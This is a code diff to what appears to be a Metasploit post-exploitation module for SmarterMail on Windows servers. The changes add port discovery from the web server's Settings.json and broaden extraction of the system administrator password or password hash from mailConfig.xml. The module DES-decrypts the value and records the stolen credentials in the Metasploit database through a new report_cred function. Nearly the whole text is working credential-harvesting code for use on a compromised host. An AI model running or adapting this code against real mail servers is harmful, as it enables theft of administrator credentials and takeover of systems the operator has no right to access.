@@ -66,15 +66,47 @@ class Metasploit3 < Msf::Post
     decipher.update(encrypted) + decipher.final
   end
 
+
+  def get_bound_port(data)
+    port = nil
+
+    begin
+      port = JSON.parse(data)['BoundPort']
+    rescue JSON::ParserError => e
+      elog("#{e.class} - Unable to parse BoundPort (#{e.message}) #{e.backtrace * "\n"}")
+      return nil
+    end
+
+    port
+  end
+
+
+  def get_remote_drive
+    @drive ||= expand_path('%SystemDrive%').strip
+  end
+
+
+  def get_web_server_port
+    ['Program Files (x86)', 'Program Files'].each do |program_dir|
+      path = %Q|#{get_remote_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Web Server\\Settings.json|.strip
+      if file?(path)
+        data = read_file(path)
+        return get_bound_port(data)
+      end
+    end
+
+    return nil
+  end
+
+
   #
   # Find SmarterMail 'mailConfig.xml' config file
   #
   def get_mail_config_path
     found_path = ''
-    drive = expand_path('%SystemDrive%').strip
 
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
-      path = %Q|#{drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml|.strip
+      path = %Q|#{get_remote_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml|.strip
       vprint_status "#{peer} - Checking for SmarterMail config file: #{path}"
       if file?(path)
         found_path = path
@@ -106,10 +138,45 @@ class Metasploit3 < Msf::Post
     end
 
     username = data.match(/<sysAdminUserName>(.+)<\/sysAdminUserName>/)
-    password = data.match(/<sysAdminPassword>(.+)<\/sysAdminPassword>/)
+    password = data.scan(/<(sysAdminPassword|sysAdminPasswordHash)>(.+)<\/(sysAdminPassword|sysAdminPasswordHash)>/).flatten[1]
+
     result['username'] = username[1] unless username.nil?
-    result['password'] = decrypt_des(Rex::Text.decode_base64(password[1])) unless password.nil?
+
+    if password
+      begin
+        result['password'] = decrypt_des(Rex::Text.decode_base64(password))
+      rescue OpenSSL::Cipher::CipherError
+        result['password'] = password
+      end
+    end
+
     result
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      post_reference_name: self.refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: :password,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   #
@@ -131,15 +198,18 @@ class Metasploit3 < Msf::Post
     end
 
     # report result
+    port = get_web_server_port || 9998 # Default is 9998
     user = result['username']
     pass = result['password']
     print_good "#{peer} - Found Username: '#{user}' Password: '#{pass}'"
-    report_auth_info(
-      :host  => r_host,
-      :sname => 'http',
-      :user  => user,
-      :pass  => pass,
-      :source_id   => session.db_record ? session.db_record.id : nil,
-      :source_type => 'vuln')
+
+    report_cred(
+      ip: r_host,
+      port: port,
+      service_name: 'http',
+      user: user,
+      password: pass,
+
+    )
   end
 end
